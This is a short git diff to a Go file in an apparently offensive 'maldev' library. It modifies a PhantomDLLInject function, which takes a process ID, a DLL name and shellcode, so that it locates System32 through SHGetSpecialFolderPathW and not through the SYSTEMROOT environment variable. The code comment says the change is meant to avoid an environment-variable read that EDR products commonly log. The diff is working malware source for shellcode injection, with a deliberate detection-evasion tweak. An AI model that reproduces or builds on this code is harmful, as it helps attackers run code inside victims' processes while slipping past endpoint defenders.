@@ -5,11 +5,11 @@ package inject
 import (
 	"fmt"
 	"io"
-	"os"
 	"path/filepath"
 	"unsafe"
 
 	"github.com/oioio-space/maldev/evasion/stealthopen"
+	"github.com/oioio-space/maldev/recon/folder"
 	"github.com/oioio-space/maldev/win/api"
 	"golang.org/x/sys/windows"
 )
@@ -42,8 +42,13 @@ func PhantomDLLInject(pid int, dllName string, shellcode []byte, opener stealtho
 		return err
 	}
 
-	// 1. Build full path from System32.
-	sys32 := filepath.Join(os.Getenv("SYSTEMROOT"), "System32")
+	// 1. Build full path from System32 — resolve via SHGetSpecialFolderPathW
+	// (Shell32) instead of os.Getenv("SYSTEMROOT") to avoid the PEB env-var
+	// sniff that EDRs commonly log on credential-style techniques.
+	sys32 := folder.Get(folder.CSIDL_SYSTEM, false)
+	if sys32 == "" {
+		return fmt.Errorf("PhantomDLLInject: SHGetSpecialFolderPathW(CSIDL_SYSTEM) returned empty")
+	}
 	dllPath := filepath.Join(sys32, dllName)
 
 	op := stealthopen.Use(opener)
